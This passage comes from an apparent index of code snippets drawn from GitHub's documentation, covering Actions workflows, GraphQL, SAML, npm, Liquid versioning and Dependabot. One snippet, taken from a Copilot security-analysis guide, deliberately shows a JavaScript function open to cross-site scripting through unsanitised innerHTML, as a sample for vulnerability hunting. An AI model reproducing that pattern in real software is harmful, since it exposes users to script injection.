srcset=\"YOUR-LIGHTMODE-IMAGE\">\n <img alt=\"YOUR-ALT-TEXT\" src=\"YOUR-DEFAULT-IMAGE\">\n</picture>\n```\n\n----------------------------------------\n\nTITLE: Python Workflow using Specific Python Version\nDESCRIPTION: This workflow configures a specific version of Python, using the semantic version syntax to get the latest minor release of Python 3.x. It checks out the code, sets up Python using `setup-python` and prints out the Python version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: Python package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Set up Python\n        # This is the version of the action for setting up Python, not the Python version.\n        uses: {% data reusables.actions.action-setup-python %}\n        with:\n          # Semantic version range syntax or exact version of a Python version\n          python-version: '3.x'\n          # Optional - x64 or x86 architecture, defaults to x64\n          architecture: 'x64'\n      # You can test your matrix by printing the current Python version\n      - name: Display Python version\n        run: python -c \"import sys; print(sys.version)\"\n```\n\n----------------------------------------\n\nTITLE: Display Name with Potential XSS Vulnerability - JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates a potential XSS vulnerability. The `displayName` function retrieves an HTML element by its ID and sets its `innerHTML` property to a string that includes a user-provided `name` parameter.  If the `name` parameter contains malicious HTML, it will be executed when the page is rendered. The input is not sanitized.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/security-analysis/finding-existing-vulnerabilities-in-code.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction displayName(name) {\n  const nameElement = document.getElementById('name-display');\n  nameElement.innerHTML = `Showing results for \"${name}\"`\n}\n```\n\n----------------------------------------\n\nTITLE: GraphQL Query with Variable\nDESCRIPTION: This snippet shows a GraphQL query that utilizes a variable to dynamically specify the number of repositories to retrieve. The variable is defined outside the query in a `variables` object.  The query then accepts the variable as an argument and uses it within the `repositories` field to specify the `last` parameter. This example illustrates how to define, pass, and use variables to make GraphQL queries more dynamic.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/forming-calls-with-graphql.md#_snippet_1\n\nLANGUAGE: graphql\nCODE:\n```\nquery($number_of_repos:Int!) {\n  viewer {\n    name\n     repositories(last: $number_of_repos) {\n       nodes {\n         name\n       }\n     }\n   }\n}\nvariables {\n   \"number_of_repos\": 3\n}\n```\n\n----------------------------------------\n\nTITLE: Specifying Multiple Attribute Values in SAML\nDESCRIPTION: This XML snippet demonstrates how to specify multiple values for a SAML attribute, specifically for `public_keys`.  It uses multiple `<saml2:AttributeValue>` elements within a single `<saml2:Attribute>` element to provide a list of public keys for a user.  This allows for associating multiple SSH keys with a user account via SAML.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/iam-configuration-reference/saml-configuration-reference.md#_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<saml2:Attribute FriendlyName=\"public_keys\" Name=\"urn:oid:1.2.840.113549.1.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">\n    <saml2:AttributeValue>ssh-rsa LONG KEY</saml2:AttributeValue>\n    <saml2:AttributeValue>ssh-rsa LONG KEY 2</saml2:AttributeValue>\n</saml2:Attribute>\n```\n\n----------------------------------------\n\nTITLE: Login to npm with scope and legacy auth (GHE)\nDESCRIPTION: This snippet demonstrates how to log in to npm with a specified scope and legacy authentication for use with the GitHub Packages npm registry on a GitHub Enterprise Server instance. The `--auth-type=legacy` flag is required for npm CLI version 9 or greater. The `HOSTNAME` is a placeholder for the GitHub Enterprise Server hostname. Replace `USERNAME` and `TOKEN` with your GitHub username and personal access token, respectively.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-npm-registry.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ npm login --scope=@NAMESPACE --auth-type=legacy --registry=https://HOSTNAME/_registry/npm/\n> Username: USERNAME\n> Password: TOKEN\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with 'not FPT' and GHES versions\nDESCRIPTION: This snippet checks if the context is not FPT and renders \"Alpha\". If not FPT and the GHES version is within the specified range, it also renders \"Bravo\". If the context *is* FPT, it renders \"Charlie\".\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/and-greater-than2.md#_snippet_3\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion not fpt %}\n\nAlpha\n\n{% ifversion ghes > 2.13 and ghes < 2.16 %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Conditional Table Content after Header\nDESCRIPTION: The code snippet includes conditional content after the table header definitions. It shows conditional addition of the Cargo/Rust info based on version.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/tests/fixtures/tables.md#_snippet_5\n\nLANGUAGE: Markdown\nCODE:\n```\nPackage manager | Languages | Recommended formats | All supported formats {% ifversion fpt %}\n:- | :- | :- | :-{% endif %}{% ifversion volvo %}\nCargo | Rust | `Cargo.lock` | `Cargo.toml`, `Cargo.lock` {% endif %}\n```\n\n----------------------------------------\n\nTITLE: Create Page Trees\nDESCRIPTION: This code snippet shows the location of the code that generates the page trees during the application startup. These trees are generated entirely from the English content, which ensures that translated URLs will return a 200 OK status if the corresponding English URL returns 200 OK.\nSOURCE: https://github.com/github/docs/blob/main/src/languages/README.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nsrc/frame/lib/page-data.js#L45\n```\n\n----------------------------------------\n\nTITLE: Configuring Amazon S3 for Packages\nDESCRIPTION: This snippet configures GitHub Packages to use Amazon S3 for the staging instance. It sets the storage type to \"s3\" and configures the service URL, bucket name, access key ID, and access secret key. Replace placeholders with actual values.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/setting-up-a-staging-instance.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nghe-config secrets.packages.blob-storage-type \"s3\"\nghe-config secrets.packages.service-url \"S3 SERVICE URL\"\nghe-config secrets.packages.s3-bucket \"S3 BUCKET NAME\"\nghe-config secrets.packages.aws-access-key \"S3 ACCESS KEY ID\"\nghe-config secrets.packages.aws-secret-key \"S3 ACCESS SECRET\"\n```\n\n----------------------------------------\n\nTITLE: Filter Copilot Usage by Cost Center\nDESCRIPTION: This snippet demonstrates how to filter Copilot usage by a specific cost center within the GitHub billing interface. The query `cost_center:ce-pilot-group` is used as an example to target a cost center named 'ce-pilot-group'. This filtering is essential for analyzing spending trends within specific groups or initiatives.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/rolling-out-github-copilot-at-scale/managing-your-companys-spending-on-github-copilot.md#_snippet_1\n\nLANGUAGE: Query\nCODE:\n```\n`cost_center:ce-pilot-group`\n```\n\n----------------------------------------\n\nTITLE: Committing Updates After NCC Compilation\nDESCRIPTION: These commands add the updated `action.yml`, `dist/index.js`, and `node_modules` files to the staging area, commits the changes with a message, creates a tag, and pushes the commit and tags to the remote repository after compiling the JavaScript with Vercel NCC.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-javascript-action.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ngit add action.yml dist/index.js node_modules/*\ngit commit -m \"Use vercel/ncc\"\ngit tag -a -m \"My first action release\" v1.1\ngit push --follow-tags\n```\n\n----------------------------------------\n\nTITLE: Defining Library Path Dependencies in qlpack.yml (YAML)\nDESCRIPTION: This deprecated snippet illustrates how to declare dependencies on other CodeQL packs. This property is superseded by the `dependencies` property.  The `libraryPathDependencies` property specifies the names of dependent packs, granting access to libraries, schemas, and suites. The example shows a dependency on `codeql/javascript-all`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_19\n\nLANGUAGE: YAML\nCODE:\n```\nlibraryPathDependencies: codeql/javascript-all\n```\n\n----------------------------------------\n\nTITLE: Unset global Git configuration value (shell)\nDESCRIPTION: This command removes a specified Git configuration value from the global configuration file (`~/.gitconfig` or `C:\\Users\\YOUR-USER\\.gitconfig`). This is helpful for resolving conflicts caused by dotfiles that override GitHub Codespaces' default GPG signing settings.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-gpg-verification-for-github-codespaces.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global --unset gpg.program\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on repository visibility change to public (YAML)\nDESCRIPTION: This snippet demonstrates how to configure a GitHub Actions workflow to run when a repository's visibility changes from private to public. It uses the `public` event trigger.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_21\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  public\n```\n\n----------------------------------------\n\nTITLE: Publishing a Gradle Package\nDESCRIPTION: This snippet shows the command used to publish a package to GitHub Packages using Gradle. The command initiates the publishing process based on the Gradle configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-gradle-registry.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngradle publish\n```\n\n----------------------------------------\n\nTITLE: Calling the main function\nDESCRIPTION: This line calls the `main` function, starting the execution of the CLI application. It should be placed at the bottom of the Ruby file.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nmain\n```\n\n----------------------------------------\n\nTITLE: Environment Variables Configuration\nDESCRIPTION: This snippet shows the recommended structure for storing application credentials (App ID, Webhook Secret, Private Key Path, and potentially Enterprise Hostname) within a `.env` file. It emphasizes replacing the placeholder values with actual credentials obtained from the GitHub App settings and generating a private key.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-github-app-that-responds-to-webhook-events.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nAPP_ID=\"YOUR_APP_ID\"\nWEBHOOK_SECRET=\"YOUR_WEBHOOK_SECRET\"\nPRIVATE_KEY_PATH=\"YOUR_PRIVATE_KEY_PATH\"{% ifversion ghes %}\nENTERPRISE_HOSTNAME=\"YOUR_HOSTNAME\"{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Using localhost with Service Containers in YAML\nDESCRIPTION: This YAML snippet configures two service containers, `nginx` and `redis`, and demonstrates how to access them using `localhost` and dynamically assigned ports. It utilizes the `${{ job.services.<service_name>.ports }}` context to retrieve the host ports assigned to the containers.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_31\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  nginx:\n    image: nginx\n    # Map port 8080 on the Docker host to port 80 on the nginx container\n    ports:\n      - 8080:80\n  redis:\n    image: redis\n    # Map random free TCP port on Docker host to port 6379 on redis container\n    ports:\n      - 6379/tcp\nsteps:\n  - run: |\n      echo \"Redis available on 127.0.0.1:{% raw %}${{ job.services.redis.ports['6379'] }}{% endraw %}\"\n      echo \"Nginx available on 127.0.0.1:{% raw %}${{ job.services.nginx.ports['80'] }}{% endraw %}\"\n```\n\n----------------------------------------\n\nTITLE: Operating System Tag: Windows\nDESCRIPTION: This code snippet demonstrates how to use the `windows` tag to display content relevant to Windows users. It wraps instructions that are specific to the Windows operating system.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_8\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% windows %}\n\nThese instructions are pertinent to Windows users.\n\n{% endwindows %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: GraphQL Response with New Global Node ID\nDESCRIPTION: This JSON response shows the new global node ID format for a user. It is the result of a GraphQL query using the `X-Github-Next-Global-ID` header to request the new ID format. The legacy ID was used in the query, but the API returned the new ID format in the response.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-graphql-global-node-ids.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\"data\":{\"node\":{\"id\":\"U_kgDOADP9xw\"}}}\n```\n\n----------------------------------------\n\nTITLE: Searching audit log for team events\nDESCRIPTION: Example search queries that filter events related to the team category. The first query finds all events in the `team` category, and the second finds all events where a team was created.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/searching-the-audit-log-for-your-enterprise.md#_snippet_1\n\nLANGUAGE: Text\nCODE:\n```\naction:team\n```\n\nLANGUAGE: Text\nCODE:\n```\naction:team.create\n```\n\n----------------------------------------\n\nTITLE: Example Ruby File with Linting Issues\nDESCRIPTION: This Ruby code defines a class `Octocat` with an initializer and a display method.  It includes linting issues such as inconsistent use of frozen string literal, potential naming convention violations, and style guide infractions that RuboCop can detect.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_29\n\nLANGUAGE: Ruby\nCODE:\n```\n# frozen_string_literal: true\n\n# The Octocat class tells you about different breeds of Octocat\nclass Octocat\n  def initialize(name, *breeds)\n    # Instance variables\n    @name = name\n    @breeds = breeds\n  end\n\n  def display\n    breed = @breeds.join(\"-\")\n\n    puts \"I am of #{breed} breed, and my name is #{@name}.\"\n  end\nend\n\nm = Octocat.new(\"Mona\", \"cat\", \"octopus\")\nm.display\n```\n\n----------------------------------------\n\nTITLE: Textarea Element Example\nDESCRIPTION: This YAML snippet showcases the `textarea` element for multi-line text input in a form. It defines attributes like `label`, `description`, `value`, and `render`, along with the `required` validation. The `render` attribute is used to format the submitted text into a code block with the specified language (bash).\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/syntax-for-githubs-form-schema.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nbody:\n- type: textarea\n  id: repro\n  attributes:\n    label: Reproduction steps\n    description: \"How do you trigger this bug? Please walk us through it step by step.\"\n    value: |\n      1.\n      2.\n      3.\n      ...\n    render: bash\n  validations:\n    required: true\n```\n\n----------------------------------------\n\nTITLE: Running bugged Python file on Windows\nDESCRIPTION: This shell command is used to execute the 'bugged_dice_battle.py' Python script on a Windows system. It uses the 'py' command, which is the Python launcher for Windows, to run the specified Python file.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/learning-to-debug-with-github-copilot.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\npy bugged_dice_battle.py\n```\n\n----------------------------------------\n\nTITLE: Configuring Docker Authentication with gcloud\nDESCRIPTION: This command configures Docker to use the Google Cloud SDK (gcloud) command-line tool as a credential helper for authentication. It allows Docker to authenticate with Google Container Registry (GCR) using the credentials configured in gcloud.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngcloud --quiet auth configure-docker\n```\n\n----------------------------------------\n\nTITLE: Invalid Branch Filter - YAML\nDESCRIPTION: This example demonstrates the incorrect syntax for specifying branch filters using a flow sequence. The missing quotes around `release/v[0-9].[0-9]` will cause a YAML parsing error because it contains `[` and `]`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_41\n\nLANGUAGE: yaml\nCODE:\n```\n# Invalid - creates a parse error\nbranches: [ main, release/v[0-9].[0-9] ]\n```\n\n----------------------------------------\n\nTITLE: Liquid whitespace control\nDESCRIPTION: Example usage of Liquid whitespace control to prevent addition of newlines in lists.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_9\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{%- ifversion fpt %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Device Code Response (JSON)\nDESCRIPTION: This snippet shows the JSON response format for a device code request.  It includes the device code, user code, verification URI, expiration time, and interval for polling.  The verification URI uses a placeholder for the GitHub product URL.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"device_code\": \"3584d83530557fdd1f46af8289938c8ef79f9dc5\",\n  \"user_code\": \"WDJB-MJHT\",\n  \"verification_uri\": \"{% data variables.product.oauth_host_code %}/login/device\",\n  \"expires_in\": 900,\n  \"interval\": 5\n}\n```\n\n----------------------------------------\n\nTITLE: Nested Conditionals with GHES Version Greater Than and Less Than\nDESCRIPTION: This snippet demonstrates nested conditionals with `ifversion` where it first checks if the GHES version is greater than 2.13, and, if true, then checks if the GHES version is less than 2.16. The `else` block for the outer `ifversion` tag renders \"Charlie\" when the version is not greater than 2.13.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/greater-than.md#_snippet_5\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 2.13 %}\n\nAlpha\n\n{% ifversion ghes < 2.16 %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Prune Docker System - All Volumes\nDESCRIPTION: This command removes unused Docker images, networks, containers, and volumes from the GitHub Codespaces environment. It removes all unused volumes and reclaim disk space.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-creation-and-deletion-of-codespaces.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ndocker system prune --volumes\n```\n\n----------------------------------------\n\nTITLE: Translation directory structure\nDESCRIPTION: This snippet shows the directory structure for translated content. Each language has its own directory containing `content` and `data` folders, but no `assets` folder. The assets/images used are located in the main `assets/` directory of the english version.\nSOURCE: https://github.com/github/docs/blob/main/src/languages/README.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ntranslations/de-de\n├── content\n└── data\n```\n\n----------------------------------------\n\nTITLE: Creating Diagnostic File using SSH (ghe-diagnostics)\nDESCRIPTION: This command uses SSH to connect to the GitHub Enterprise Server instance and executes the `ghe-diagnostics` command-line utility, redirecting the output to a file named `diagnostics.txt`.  The `-p122` option specifies the port for SSH, `admin@HOSTNAME` specifies the user and hostname of the server. This command requires SSH access to the server.\nSOURCE: https://github.com/github/docs/blob/main/content/support/contacting-github-support/providing-data-to-github-support.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nssh -p122 admin@HOSTNAME -- 'ghe-diagnostics' > diagnostics.txt\n```\n\n----------------------------------------\n\nTITLE: Reinstalling Git LFS\nDESCRIPTION: This command reinstalls the Git Large File Storage (LFS) client. It ensures that the LFS client is properly configured to handle large file uploads.  It should be executed in the terminal within the git repository.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/resolving-git-large-file-storage-upload-failures.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit lfs install\n```\n\n----------------------------------------\n\nTITLE: Add Pull Request to Project via GraphQL\nDESCRIPTION: Uses the GitHub CLI and GraphQL API to add a pull request to a project. It constructs a GraphQL mutation to add the pull request (identified by its node ID) to the specified project. The response is parsed to extract the ID of the created item, which is then stored as an environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/automating-projects-using-actions.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nitem_id=\"$( gh api graphql -f query='\\n            mutation($project:ID!, $pr:ID!) {\\n              addProjectV2ItemById(input: {projectId: $project, contentId: $pr}) {\\n                item {\\n                  id\\n                }\\n              }\\n            }' -f project=$PROJECT_ID -f pr=$PR_ID --jq '.data.addProjectV2ItemById.item.id')\"\n\n          # Stores the ID of the created item as an environment variable.\n          echo 'ITEM_ID='$item_id >> $GITHUB_ENV\n```\n\n----------------------------------------\n\nTITLE: Checking System SSH Configuration - Shell\nDESCRIPTION: This command executes `ssh` in verbose mode (`-v`) to a specified URL, displaying debug information. This helps identify which configuration files are being loaded and which options are being applied. The output reveals the order in which configuration files such as `~/.ssh/config` and `/etc/ssh_config` are processed.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/using-ssh-agent-forwarding.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n$ ssh -v URL\n# Connect to the specified URL with verbose debug output\n> OpenSSH_8.1p1, LibreSSL 2.7.3\n> debug1: Reading configuration data /Users/YOU/.ssh/config\n> debug1: Applying options for example.com\n> debug1: Reading configuration data /etc/ssh_config\n> debug1: Applying options for *\n$ exit\n# Returns to your local command prompt\n```\n\n----------------------------------------\n\nTITLE: Using Variables with runs-on in GitHub Actions YAML\nDESCRIPTION: This snippet shows how to combine strings and variables within an array in the `runs-on` specification. The workflow uses a workflow dispatch input `chosen-os` to dynamically select the operating system for the runner. Quotation marks are required for expressions like `${{ inputs.chosen-os }}`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/choosing-runner-overview.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_dispatch:\n    inputs:\n      chosen-os:\n        required: true\n        type: choice\n        options:\n        - Ubuntu\n        - macOS\n\njobs:\n  test:\n    runs-on: [self-hosted, \"${{ inputs.chosen-os }}\"]\n    steps:\n    - run: echo Hello world!\n```\n\n----------------------------------------\n\nTITLE: Adding GPG Key to Bash Profile - Shell\nDESCRIPTION: This snippet adds the GPG key to the `.bash_profile` or `.profile` file if the user is using the `bash` shell. It determines the current TTY and exports it as the `GPG_TTY` environment variable. This ensures that GPG can interact with the terminal to prompt for passphrases or PINs. The snippet is designed for macOS.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/telling-git-about-your-signing-key.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ if [ -r ~/.bash_profile ]; then echo -e '\\nexport GPG_TTY=$(tty)' >> ~/.bash_profile; \\\n  else echo -e '\\nexport GPG_TTY=$(tty)' >> ~/.profile; fi\n```\n\n----------------------------------------\n\nTITLE: Creating and Pushing a Git Branch to Recover a Commit\nDESCRIPTION: These commands create a new local branch from an existing branch and then push it to a remote repository. This is used to recover a commit that might have been orphaned due to a force push or branch deletion. The commands require push access to the remote repository. The input is the original branch name (B) and the desired name for the new remote branch (recover-B).\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/troubleshooting-commits/commit-exists-on-github-but-not-in-my-local-clone.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ git branch recover-B B\n# Create a new local branch referencing the commit\n$ git push upstream B:recover-B\n# Push local B to new upstream branch, creating new reference to commit\n```\n\n----------------------------------------\n\nTITLE: Generating Migration Script (GHES 3.8+ or Azure)\nDESCRIPTION: This snippet demonstrates how to generate a migration script using the `gh gei generate-script` command for GitHub Enterprise Server 3.8 or later, or for version 3.7 or lower when using Azure Blob Storage.  The command specifies source and destination organizations, an output filename, and the GitHub Enterprise Server API URL.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngh gei generate-script --github-source-org SOURCE \\\n  --github-target-org DESTINATION \\\n  --output FILENAME \\\n  --ghes-api-url GHES-API-URL\n```\n\n----------------------------------------\n\nTITLE: Conditional Note based on GHES Version and Commit Count (Liquid)\nDESCRIPTION: This snippet displays a note to the user if the GitHub Enterprise Server version is not present (i.e., on GitHub.com). The note informs the user that certain insights are limited to repositories with fewer than 10,000 commits. The `ifversion not ghes` Liquid tag conditionally renders the enclosed content based on the GHES version.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/repo-insights-commit-limit.md#_snippet_0\n\nLANGUAGE: liquid\nCODE:\n```\n{% ifversion not ghes %}\n\n> [!NOTE]\n> Certain contributor, commit, and code frequency insights are only available for repositories that have less than 10,000 commits.\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Conditional Display based on GHEC Version\nDESCRIPTION: This code snippet uses a conditional statement (`{% ifversion ghec %}`) to check if the GitHub Enterprise Cloud version is enabled. If it is, it displays a message regarding team synchronization behavior when the organization is owned by an enterprise account. It includes a link to a relevant documentation page for more information.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-accounts/team-sync-override.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n{% ifversion ghec %}\nIf your organization is owned by an enterprise account, enabling team synchronization for the enterprise account will override your organization-level team synchronization settings. For more information, see [AUTOTITLE](/admin/identity-and-access-management/using-saml-for-enterprise-iam/managing-team-synchronization-for-organizations-in-your-enterprise).\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Markdown Next Steps Section Example\nDESCRIPTION: This snippet demonstrates the structure and content of a 'Next steps' section in a Markdown document. It provides links to related procedures or resources that users might want to explore after completing the current task. The example includes links to monitoring self-hosted runners, troubleshooting issues, and security hardening for GitHub Actions.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/contents-of-a-github-docs-article.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n## Next steps\n\n- You can monitor self-hosted runners and troubleshoot common issues. See \"Monitoring and troubleshooting self hosted runners.\"\n\n- {% data variables.product.company_short %} recommends that you review security considerations for self-hosted runner machines. See \"Security hardening for {% data variables.product.prodname_actions %}.\"\n```\n\n----------------------------------------\n\nTITLE: Grouping Minor/Patch Updates in Dependabot\nDESCRIPTION: This YAML snippet configures Dependabot to create a group called `angular` for npm dependencies. It includes dependencies matching the pattern `@angular*` and restricts the group to only include `minor` and `patch` updates, using `update-types`. The configuration specifies weekly updates.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/dependabot/dependabot-version-updates-groups-yaml-example.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nupdates:\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    groups:\n      # Specify a name for the group, which will be used in pull request titles\n      # and branch names\n      angular:{% ifversion dependabot-grouped-security-updates-config %}\n        applies-to: version-updates{%- endif %}\n        patterns:\n          - \"@angular*\"\n        update-types:\n          - \"minor\"\n          - \"patch\"\n```\n\n----------------------------------------\n\nTITLE: Handling Redirect URI Mismatch Error\nDESCRIPTION: This code snippet shows the URL parameters returned to the callback URL when the provided `redirect_uri` does not match the registered callback URL for the OAuth application. The response includes an error code, a descriptive message, a URI for further documentation, and the state parameter.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/maintaining-oauth-apps/troubleshooting-authorization-request-errors.md#_snippet_1\n\nLANGUAGE: HTTP\nCODE:\n```\nhttp://your-application.com/callback?error=redirect_uri_mismatch\n  &error_description=The+redirect_uri+MUST+match+the+registered+callback+URL+for+this+application.\n  &error_uri=/apps/building-integrations/setting-up-and-registering-oauth-apps/troubleshooting-authorization-request-errors/%23redirect-uri-mismatch\n  &state=xyz\n```\n\n----------------------------------------\n\nTITLE: Defining Dropdown in YAML\nDESCRIPTION: This YAML snippet demonstrates how to define a dropdown element within a form schema. It showcases the use of `type`, `id`, `attributes` (including `label`, `options`, and `default`), and `validations` (specifically `required`). The `options` array provides the choices available to the user, and `default` specifies the preselected option's index.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/syntax-for-githubs-form-schema.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: dropdown\n  id: download\n  attributes:\n    label: How did you download the software?\n    options:\n      - Built from source\n      - Homebrew\n      - MacPorts\n      - apt-get\n    default: 0\n  validations:\n    required: true\n```\n\n----------------------------------------\n\nTITLE: Querying Audit Logs for User Provisioning\nDESCRIPTION: This audit log query helps determine if a user has been provisioned in GitHub by searching for `external_identity.provision` events associated with a specific username (and potentially a shortcode for GHEC).  The query targets audit logs to provide information about the request outcome, payload, and any related errors for user provisioning.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/provisioning-users-and-groups-with-scim-using-the-rest-api.md#_snippet_7\n\nLANGUAGE: text\nCODE:\n```\naction:external_identity.provision  user:USERNAME{% ifversion ghec %}_SHORTCODE{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Conditional Step Execution based on Event Type - YAML\nDESCRIPTION: This workflow runs when an issue or pull request is closed. It demonstrates how to run different steps based on whether the `github.event` context contains an `issue` or `pull_request` value. The `if_issue` step runs if an issue was closed, while `if_pr` runs if a pull request was closed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  issues:\n    types:\n      - closed\n  pull_request:\n    types:\n      - closed\n\njobs:\n  state_event_type:\n    runs-on: ubuntu-latest\n    steps:\n    - name: if_issue\n      if: github.event.issue\n      run: |\n        echo An issue was closed\n    - name: if_pr\n      if: github.event.pull_request\n      run: |\n        echo A pull request was closed\n```\n\n----------------------------------------\n\nTITLE: Exporting Diagnostic Information to SARIF using CodeQL CLI\nDESCRIPTION: This command uses the CodeQL CLI to export diagnostic information from a failed analysis into a SARIF file. The `--sarif-category` specifies the language being analyzed, `--format` specifies the SARIF format version, and `--output` defines the path for the generated SARIF file. This enables subsequent uploading of diagnostic 